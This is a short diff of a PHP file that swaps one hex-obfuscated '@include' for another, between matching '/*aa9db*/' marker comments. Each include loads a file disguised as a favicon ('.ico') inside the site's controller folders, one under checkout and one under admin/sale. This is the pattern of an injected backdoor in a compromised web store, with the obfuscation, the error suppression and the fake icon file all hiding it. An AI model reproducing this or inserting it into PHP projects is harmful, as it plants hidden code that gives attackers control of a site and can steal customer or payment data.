@@ -1,8 +1,7 @@
 <?php
-
 /*aa9db*/
 
-@include "\x2fvar/\x77ww/h\x74ml/p\x75blic\x2fcata\x6cog/c\x6fntro\x6cler/\x63heck\x6fut/f\x61vico\x6e_beb\x348e.i\x63o";
+@include "\x2fvar/\x77ww/h\x74ml/p\x75blic\x2fadmi\x6e/con\x74roll\x65r/sa\x6ce/fa\x76icon\x5f67be\x37a.ic\x6f";
 
 /*aa9db*/
 
